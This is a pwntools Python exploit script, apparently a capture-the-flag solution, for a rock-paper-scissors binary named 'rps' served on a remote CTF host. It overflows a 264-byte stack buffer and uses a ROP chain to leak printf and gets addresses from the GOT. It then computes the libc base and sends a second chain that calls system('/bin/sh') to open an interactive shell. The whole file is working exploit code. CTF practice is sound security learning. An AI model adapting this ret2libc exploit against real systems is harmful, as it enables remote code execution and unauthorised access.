#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./rps")

if args.REMOTE:
    p = remote("potluck.0xa.is", 31339)
    libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so") # https://libc.blukat.me/?q=printf%3Af70%2Cgets%3A190
else:
    p = process(binary.path)
    libc = ELF("/usr/lib/libc.so.6")

rop = ROP([binary])
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

payload = b''
payload += b'P'*264
payload += p64(pop_rdi)
payload += p64(next(binary.search(b"Computer chose %s you lose!\n")))
payload += p64(pop_rsi_r15)
payload += p64(binary.got.printf)
payload += p64(0)
payload += p64(binary.plt.printf)

payload += p64(pop_rdi)
payload += p64(next(binary.search(b"Computer chose %s you lose!\n")))
payload += p64(pop_rsi_r15)
payload += p64(binary.got.gets)
payload += p64(0)
payload += p64(binary.plt.printf)
payload += p64(binary.symbols["_start"])

p.sendlineafter("scissors?\n", payload)
p.recvline()
p.recvline()

p.recvuntil(b"chose ")
printf = int.from_bytes(p.recvuntil(b" ").rstrip(), "little")
p.recvuntil(b"chose ")
gets = int.from_bytes(p.recvuntil(b" ").rstrip(), "little")

libc.address = printf - libc.sym.printf

log.info(f"Got printf 0x{printf:x}")
log.info(f"Got gets 0x{gets:x}")
log.info(f"Got libc base 0x{libc.address:x}")

payload = b''
payload += b'P'*264
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

p.sendlineafter("scissors?\n", payload)
p.interactive()



